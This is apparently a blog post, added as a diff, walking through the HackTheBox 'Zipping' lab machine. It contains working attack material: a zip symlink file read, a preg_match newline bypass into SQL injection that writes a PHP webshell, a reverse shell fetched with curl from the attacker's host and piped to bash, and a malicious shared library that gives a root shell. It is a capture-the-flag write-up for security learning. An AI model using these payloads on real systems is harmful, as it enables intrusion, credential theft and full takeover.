@@ -1,0 +1,393 @@
+export const meta = {
+    slug: "zipping",
+    title: "Zipping",
+    description: "A walkthrough in the Zipping machine provided by xdann1",
+    category: "walkthrough",
+    author: "Samuele Sciatore",
+    date: "2023-09-10",
+    tags: ["hacking", "pentesting", "hackthebox"]
+}
+
+!["image of zipping machine"](/assets/blog/posts/zipping/zipping.png)
+Creator: [xdann1](https://app.hackthebox.com/users/535069)
+
+# Enumeration
+
+## Nmap
+```bash title="localhost"
+nmap zipping.htb   
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 14:46 CEST  
+Nmap scan report for zipping.htb (10.10.11.229)  
+Host is up (0.053s latency).  
+Not shown: 998 closed tcp ports (conn-refused)  
+PORT STATE SERVICE  
+22/tcp open ssh  
+80/tcp open http  
+  
+Nmap done: 1 IP address (1 host up) scanned in 2.95 seconds
+```
+
+```bash title="localhost"
+nmap --script=http-enum zipping.htb  
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 14:48 CEST  
+Nmap scan report for zipping.htb (10.10.11.229)  
+Host is up (0.078s latency).  
+Not shown: 998 closed tcp ports (conn-refused)  
+PORT STATE SERVICE  
+22/tcp open ssh  
+80/tcp open http  
+| http-enum:   
+|_ /shop/: Potentially interesting folder  
+  
+Nmap done: 1 IP address (1 host up) scanned in 12.13 seconds
+```
+
+## Website Analysis
+If you click the work with us button, you will be redirected to a page containing
+an upload form.
+This form says to upload a `.zip` file containing a pdf.
+
+# Passwd
+Using `zip symlink` exploit we can obtain passwd.
+[This is a tutorial on how use the exploit](https://www.youtube.com/watch?v=bRZhOB8T9Ig).
+
+```bash title="localhost"
+ln -s /etc/passwd test.pdf
+zip -r --symlinks exploit.zip test.pdf
+```
+
+```bash title="passwd"
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
+systemd-resolve:x:104:110:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+rektsu:x:1001:1001::/home/rektsu:/bin/bash
+mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
+_laurel:x:999:999::/var/log/laurel:/bin/false
+```
+
+But we cannot read `/etc/shadow`.
+However, we can read `/var/www/html/shop/index.php` and we can discover that in `/var/www/html/shop` there is a file called `functions.php` that we can read with the same method.
+
+We have the credentials of the database! But the port `3306` is closed (the database is useless however).
+
+```php title="function.php"
+<?php
+function pdo_connect_mysql() {
+    // Update the details below with your MySQL details
+    $DATABASE_HOST = 'localhost';
+    $DATABASE_USER = 'root';
+    $DATABASE_PASS = 'MySQL_P@ssw0rd!';
+    $DATABASE_NAME = 'zipping';
+    try {
+    	return new PDO('mysql:host=' . $DATABASE_HOST . ';dbname=' . $DATABASE_NAME . ';charset=utf8', $DATABASE_USER, $DATABASE_PASS);
+    } catch (PDOException $exception) {
+    	// If there is an error with the connection, stop the script and display the error.
+    	exit('Failed to connect to database!');
+    }
+}
+// Template header, feel free to customize this
+function template_header($title) {
+$num_items_in_cart = isset($_SESSION['cart']) ? count($_SESSION['cart']) : 0;
+echo <<<EOT
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<title>$title</title>
+		<link href="assets/style.css" rel="stylesheet" type="text/css">
+		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css">
+	</head>
+	<body>
+        <header>
+            <div class="content-wrapper">
+                <a href=".." style="text-decoration: none;"><h1>Zipping Watch Store</h1></a>
+                <nav>
+                    <a href="index.php">Home</a>
+                    <a href="index.php?page=products">Products</a>
+                </nav>
+                <div class="link-icons">
+                    <a href="index.php?page=cart">
+						<i class="fas fa-shopping-cart"></i>
+						<span>$num_items_in_cart</span>
+					</a>
+                </div>
+            </div>
+        </header>
+        <main>
+EOT;
+}
+// Template footer
+function template_footer() {
+$year = date('Y');
+echo <<<EOT
+        </main>
+        <footer>
+            <div class="content-wrapper">
+                <p>&copy; $year, Zipping Watch Store</p>
+            </div>
+        </footer>
+    </body>
+</html>
+EOT;
+}
+?>
+```
+
+Continuing inspecting other files we can find in `cart.php` that the site use `preg_match`.
+
+```php title="cart.php"
+<?php
+// If the user clicked the add to cart button on the product page we can check for the form data
+if (isset($_POST['product_id'], $_POST['quantity'])) {
+    // Set the post variables so we easily identify them, also make sure they are integer
+    $product_id = $_POST['product_id'];
+    $quantity = $_POST['quantity'];
+    // Filtering user input for letters or special characters
+    if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$/", $product_id, $match) || preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}[\]\\|;:'\",.<>\/?]/i", $quantity, $match)) {
+        echo '';
+    } else {
+        // Construct the SQL statement with a vulnerable parameter
+        $sql = "SELECT * FROM products WHERE id = '" . $_POST['product_id'] . "'";
+        // Execute the SQL statement without any sanitization or parameter binding
+        $product = $pdo->query($sql)->fetch(PDO::FETCH_ASSOC);
+        // Check if the product exists (array is not empty)
+        if ($product && $quantity > 0) {
+            // Product exists in database, now we can create/update the session variable for the cart
+            if (isset($_SESSION['cart']) && is_array($_SESSION['cart'])) {
+                if (array_key_exists($product_id, $_SESSION['cart'])) {
+                    // Product exists in cart so just update the quanity
+                    $_SESSION['cart'][$product_id] += $quantity;
+                } else {
+                    // Product is not in cart so add it
+                    $_SESSION['cart'][$product_id] = $quantity;
+                }
+            } else {
+                // There are no products in cart, this will add the first product to cart
+                $_SESSION['cart'] = array($product_id => $quantity);
+            }
+        }
+        // Prevent form resubmission...
+        header('location: index.php?page=cart');
+        exit;
+    }
+}
+
+// Remove product from cart, check for the URL param "remove", this is the product id, make sure it's a number and check if it's in the cart
+if (isset($_GET['remove']) && is_numeric($_GET['remove']) && isset($_SESSION['cart']) && isset($_SESSION['cart'][$_GET['remove']])) {
+
+    // Remove the product from the shopping cart
+    unset($_SESSION['cart'][$_GET['remove']]);
+}
+
+// Update product quantities in cart if the user clicks the "Update" button on the shopping cart page
+if (isset($_POST['update']) && isset($_SESSION['cart'])) {
+    // Loop through the post data so we can update the quantities for every product in cart
+    foreach ($_POST as $k => $v) {
+        if (strpos($k, 'quantity') !== false && is_numeric($v)) {
+            $id = str_replace('quantity-', '', $k);
+            $quantity = (int)$v;
+            // Always do checks and validation
+            if (is_numeric($id) && isset($_SESSION['cart'][$id]) && $quantity > 0) {
+                // Update new quantity
+                $_SESSION['cart'][$id] = $quantity;
+            }
+        }
+    }
+    // Prevent form resubmission...
+    header('location: index.php?page=cart');
+    exit;
+}
+
+// Send the user to the place order page if they click the Place Order button, also the cart should not be empty
+if (isset($_POST['placeorder']) && isset($_SESSION['cart']) && !empty($_SESSION['cart'])) {
+    header('Location: index.php?page=placeorder');
+    exit;
+}
+
+if (isset($_POST['clear'])) {
+	unset($_SESSION['cart']);
+}
+
+// Check the session variable for products in cart
+$products_in_cart = isset($_SESSION['cart']) ? $_SESSION['cart'] : array();
+$products = array();
+$subtotal = 0.00;
+// If there are products in cart
+if ($products_in_cart) {
+    // There are products in the cart so we need to select those products from the database
+    // Products in cart array to question mark string array, we need the SQL statement to include IN (?,?,?,...etc)
+    $array_to_question_marks = implode(',', array_fill(0, count($products_in_cart), '?'));
+    $stmt = $pdo->prepare('SELECT * FROM products WHERE id IN (' . $array_to_question_marks . ')');
+    // We only need the array keys, not the values, the keys are the id's of the products
+    $stmt->execute(array_keys($products_in_cart));
+    // Fetch the products from the database and return the result as an Array
+    $products = $stmt->fetchAll(PDO::FETCH_ASSOC);
+    // Calculate the subtotal
+    foreach ($products as $product) {
+        $subtotal += (float)$product['price'] * (int)$products_in_cart[$product['id']];
+    }
+}
+?>
+
+<?=template_header('Zipping | Cart')?>
+
+<div class="cart content-wrapper">
+    <h1>Shopping Cart</h1>
+    <form action="index.php?page=cart" method="post">
+        <table>
+            <thead>
+                <tr>
+                    <td colspan="2">Product</td>
+                    <td>Price</td>
+                    <td>Quantity</td>
+                    <td>Total</td>
+                </tr>
+            </thead>
+            <tbody>
+                <?php if (empty($products)): ?>
+                <tr>
+                    <td colspan="5" style="text-align:center;">You have no products added in your Shopping Cart</td>
+                </tr>
+                <?php else: ?>
+                <?php foreach ($products as $product): ?>
+                <tr>
+                    <td class="img">
+                        <a href="index.php?page=product&id=<?=$product['id']?>">
+                            <img src="assets/imgs/<?=$product['img']?>" width="50" height="50" alt="<?=$product['name']?>">
+                        </a>
+                    </td>
+                    <td>
+                        <a href="index.php?page=product&id=<?=$product['id']?>"><?=$product['name']?></a>
+                        <br>
+                        <a href="index.php?page=cart&remove=<?=$product['id']?>" class="remove">Remove</a>
+                    </td>
+                    <td class="price">&dollar;<?=$product['price']?></td>
+                    <td class="quantity">
+                        <input type="number" name="quantity-<?=$product['id']?>" value="<?=$products_in_cart[$product['id']]?>" min="1" max="<?=$product['quantity']?>" placeholder="Quantity" required>
+                    </td>
+                    <td class="price">&dollar;<?=$product['price'] * $products_in_cart[$product['id']]?></td>
+                </tr>
+                <?php endforeach; ?>
+                <?php endif; ?>
+            </tbody>
+        </table>
+        <div class="subtotal">
+            <span class="text">Subtotal</span>
+            <span class="price">&dollar;<?=$subtotal?></span>
+        </div>
+        <div class="buttons">
+            <input type="submit" value="Update" name="update">
+            <input type="submit" value="Place Order" name="placeorder">
+	    <input type="submit" value="Clear" name="clear" onsubmit="">
+        </div>
+    </form>
+</div>
+
+<?=template_footer()?>
+
+```
+
+# Reverse shell
+Ok so we can bypass `preg_match` using `%0A` before the value.
+
+We create a reverse shell
+```bash title="localhost"
+echo "bash -c 'bash -i >& /dev/tcp/10.10.14.221/4444 0>&1'" > rev.sh
+```
+
+We host it to a python server
+```bash title="localhost"
+python3 -m http.server 80
+```
+
+We start a nc listening on the port we choose
+
+```bash title="localhost"
+nc -lvp 4444
+```
+
+We download the shell on the target machine using the `preg_match` bypass
+```bash title="localhost"
+curl -s $'http://zipping.htb/shop/index.php?page=product&id=%0A\'%3bselect+\'<%3fphp+system(\"curl+http%3a//10.10.14.221/rev.sh|bash\")%3b%3f>\'+into+outfile+\'/var/lib/mysql/revs.php\'+%231'
+```
+
+we start the reverse shell using `preg_match` bypass again.
+
+```bash title="localhost"
+curl -s $'http://zipping.htb/shop/index.php?page=..%2f..%2f..%2f..%2f..%2fvar%2flib%2fmysql%2frevs'
+```
+
+on the listening connection we get a reverse shell!
+
+## Stabilize shell
+To stabilize our shell, I found [this tutorial](https://brain2life.hashnode.dev/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal?source=post_page-----3db77d07bc06--------------------------------).
+
+## User flag
+```bash title="zipping.htb"
+cat /home/rektsu/user.txt
+e********6
+```
+
+# Stock
+Using the `strings` command we can inspect the string characters into the file `/usr/bin/stock`
+
+```bash title="zipping.htb"
+strings /usr/bin/stock
+...
+S******r  
+...
+```
+
+As we can see, we found the password to run the program.
+
+## Debugging
+Using `strace /usr/bin/stock` we can debug the program and find out that the program is trying to use a non-existent file, `/home/rektsu/.config/libcounter.so`.
+
+So, we will create the file and then run the `stock` again.
+
+```bash title="zipping.htb"
+rektsu@zipping:/home/rektsu$ nano exp.c  
+rektsu@zipping:/home/rektsu$ cat exp.c 
+
+#include <stdio.h>  
+#include <stdlib.h>  
+  
+static void inject() __attribute__((constructor));  
+  
+void inject(){  
+system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");  
+}  
+
+rektsu@zipping:/home/rektsu$ gcc -shared -o /home/rektsu/.config/libcounter.so -fPIC exp.c   
+rektsu@zipping:/home/rektsu$ sudo /usr/bin/stock  
+Enter the password: S******r  
+root@zipping:/home/rektsu# whoami  
+root  
+```
+
+## Root flag
+```
+root@zipping:/home/rektsu# cat /root/root.txt 
+b********f
+```
